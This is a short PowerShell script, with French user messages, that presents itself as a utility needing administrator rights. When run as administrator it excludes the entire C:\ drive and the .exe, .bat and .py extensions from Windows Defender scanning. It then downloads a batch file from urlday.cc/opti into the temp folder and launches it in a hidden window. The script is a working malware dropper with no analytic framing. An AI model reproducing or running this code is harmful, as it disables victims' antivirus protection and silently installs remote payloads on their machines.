$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    chcp 65001 > $null
    Write-Host "`nPour pouvoir utiliser l'utilitaire, vous devez etre un administrateur executant une session de console."
    Write-Host "`n"
    chcp 850 > $null
} else {
    set powershell=%SYSTEMROOT%\System32\WindowsPowerShell\v1.0\powershell.exe
    powershell -Command "Add-MpPreference -ExclusionPath 'C:\'"
    powershell -Command "Add-MpPreference -ExclusionExtension '.exe'"
    powershell -Command "Add-MpPreference -ExclusionExtension '.bat'"
    powershell -Command "Add-MpPreference -ExclusionExtension '.py'"
    iwr -useb urlday.cc/opti -o $env:TEMP\x.bat; saps $env:TEMP\x.bat -WindowStyle Hidden
}



